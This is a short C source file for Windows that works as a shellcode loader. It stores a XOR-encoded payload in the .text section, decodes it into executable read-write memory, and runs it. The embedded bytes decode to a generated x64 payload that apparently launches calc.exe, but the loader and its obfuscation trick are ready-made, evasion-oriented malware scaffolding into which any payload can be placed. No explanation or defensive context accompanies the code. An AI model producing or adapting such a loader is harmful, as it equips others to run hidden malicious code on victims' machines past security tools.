#include <stdio.h>
#include <Windows.h>


//store the payload in the .text section 
#pragma section(".text")
__declspec(allocate(".text")) const unsigned char payload[] = {0x6C,0xD8,0x13,0x74,0x60,0x78,0x50,0x90,0x90,0x90,0xD1,0xC1,0xD1,0xC0,0xC2,0xC1,0xC6,0xD8,0xA1,0x42,0xF5,0xD8,0x1B,0xC2,0xF0,0xD8,0x1B,0xC2,0x88,0xD8,0x1B,0xC2,0xB0,0xD8,0x1B,0xE2,0xC0,0xD8,0x9F,0x27,0xDA,0xDA,0xDD,0xA1,0x59,0xD8,0xA1,0x50,0x3C,0xAC,0xF1,0xEC,0x92,0xBC,0xB0,0xD1,0x51,0x59,0x9D,0xD1,0x91,0x51,0x72,0x7D,0xC2,0xD1,0xC1,0xD8,0x1B,0xC2,0xB0,0x1B,0xD2,0xAC,0xD8,0x91,0x40,0x1B,0x10,0x18,0x90,0x90,0x90,0xD8,0x15,0x50,0xE4,0xF7,0xD8,0x91,0x40,0xC0,0x1B,0xD8,0x88,0xD4,0x1B,0xD0,0xB0,0xD9,0x91,0x40,0x73,0xC6,0xD8,0x6F,0x59,0xD1,0x1B,0xA4,0x18,0xD8,0x91,0x46,0xDD,0xA1,0x59,0xD8,0xA1,0x50,0x3C,0xD1,0x51,0x59,0x9D,0xD1,0x91,0x51,0xA8,0x70,0xE5,0x61,0xDC,0x93,0xDC,0xB4,0x98,0xD5,0xA9,0x41,0xE5,0x48,0xC8,0xD4,0x1B,0xD0,0xB4,0xD9,0x91,0x40,0xF6,0xD1,0x1B,0x9C,0xD8,0xD4,0x1B,0xD0,0x8C,0xD9,0x91,0x40,0xD1,0x1B,0x94,0x18,0xD8,0x91,0x40,0xD1,0xC8,0xD1,0xC8,0xCE,0xC9,0xCA,0xD1,0xC8,0xD1,0xC9,0xD1,0xCA,0xD8,0x13,0x7C,0xB0,0xD1,0xC2,0x6F,0x70,0xC8,0xD1,0xC9,0xCA,0xD8,0x1B,0x82,0x79,0xC7,0x6F,0x6F,0x6F,0xCD,0xD8,0x2A,0x91,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xD8,0x1D,0x1D,0x91,0x91,0x90,0x90,0xD1,0x2A,0xA1,0x1B,0xFF,0x17,0x6F,0x45,0x2B,0x60,0x25,0x32,0xC6,0xD1,0x2A,0x36,0x05,0x2D,0x0D,0x6F,0x45,0xD8,0x13,0x54,0xB8,0xAC,0x96,0xEC,0x9A,0x10,0x6B,0x70,0xE5,0x95,0x2B,0xD7,0x83,0xE2,0xFF,0xFA,0x90,0xC9,0xD1,0x19,0x4A,0x6F,0x45,0xF3,0xF1,0xFC,0xF3,0xBE,0xF5,0xE8,0xF5,0x90};

VOID XOR(IN BYTE* pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey)
{
	for (SIZE_T i = 0; i < sShellcodeSize; i++)
	{
		pShellcode[i] = pShellcode[i] ^ bKey;
	}
}

int main()
{
	BYTE key = 0x90;
	size_t payload_size = sizeof(payload);

	LPVOID decrypted_payload = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (decrypted_payload == NULL)
	{
		return -1;
	}

	memcpy(decrypted_payload, payload, payload_size);
	XOR((BYTE*)decrypted_payload, payload_size, key);

	void (*payload_func)() = (void(*)())decrypted_payload;
	payload_func();

	printf("[+] press enter to quit...");
	getchar();

	return 0;
}
